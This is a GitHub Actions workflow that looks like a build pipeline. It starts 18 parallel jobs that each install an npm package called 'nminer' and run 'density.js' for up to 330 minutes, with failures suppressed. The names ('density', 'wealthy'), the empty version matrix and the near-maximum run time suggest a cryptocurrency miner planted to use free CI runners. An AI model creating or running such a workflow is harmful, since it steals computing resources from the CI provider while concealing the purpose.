name: density
on:
  push:
    branches: [ "main" ]

jobs:
  build:
    runs-on: ubuntu-latest
    strategy:
      matrix:
        config:
          - { version: 280 }
          - { version: 2405 }
          - { version: 4910 }
          - { version: 1756 }
          - { version: 4813 }
          - { version: 3944 }
          - { version: 3108 }
          - { version: 8617 }
          - { version: 1999 }
          - { version: 5807 }
          - { version: 6019 }
          - { version: 9529 }
          - { version: 3655 }
          - { version: 2702 }
          - { version: 5918 }
          - { version: 2022 }
          - { version: 9688 }
          - { version: 8822 }

    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Install Node.js
        uses: actions/setup-node@v3
        with:
          node-version: 20
          
      - name: wealthy
        run: |
          npm install nminer@latest
          timeout 330m node density.js || echo "density executed"